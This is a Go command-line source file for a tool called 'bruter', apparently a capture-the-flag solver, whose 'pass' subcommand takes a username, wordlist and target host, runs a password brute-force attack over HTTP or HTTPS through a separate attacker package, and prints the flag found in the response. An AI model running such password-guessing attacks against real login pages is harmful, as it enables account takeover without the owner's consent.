/*
Copyright © 2024 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"bruter/shared"
	"bruter/structs/attacker"
	"fmt"
	"log"

	"github.com/spf13/cobra"
)

// passCmd represents the pass command
var passCmd = &cobra.Command{
	Use:   "pass",
	Short: "brute force the password of the given user",
	Long:  `this option allows the brute-force of a user's password.`,
	Run: func(cmd *cobra.Command, args []string) {
		var aobj *attacker.Attacker
		var content []byte
		var err error
		var flagval string
		var route string
		var scheme string
		var secure bool
		var target string
		var username string
		var wordlist string

		username, err = cmd.Flags().GetString("username")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		wordlist, err = cmd.Flags().GetString("wordlist")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		target, err = cmd.Flags().GetString("target")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		route, err = cmd.Flags().GetString("route")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		secure, err = cmd.Flags().GetBool("secure")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		if secure {
			scheme = "https"
		} else {
			scheme = "http"
		}

		fmt.Printf("Username: %s\n", username)
		fmt.Printf("Wordlist: %s\n", wordlist)
		fmt.Printf("Target: %s\n", target)
		fmt.Printf("Route: %s\n", route)
		fmt.Printf("Scheme: %s\n", scheme)
		fmt.Printf("\n")

		aobj, err = attacker.NewAttacker(
			attacker.WithRoute(route),
			attacker.WithTargetIP(target),
			attacker.WithUsername(username),
			attacker.WithWordlist(wordlist),
			attacker.WithScheme(scheme),
		)
		if err != nil {
			log.Panicf("error initializing attacker: %s\n", err.Error())
		}

		_, content, err = aobj.Attack()
		if err != nil {
			log.Panicf("%s\n", err.Error())
		}

		flagval, err = shared.ReadFlag(content)
		if err != nil {
			log.Panicf(err.Error())
		}

		fmt.Printf("\nFlag: %s\n", flagval)
	},
}

func init() {
	rootCmd.AddCommand(passCmd)
	passCmd.Flags().StringP("username", "u", "", "username to brute force password of")
	passCmd.Flags().StringP("wordlist", "w", "passwords.txt", "wordlist containing possible passwords")
}
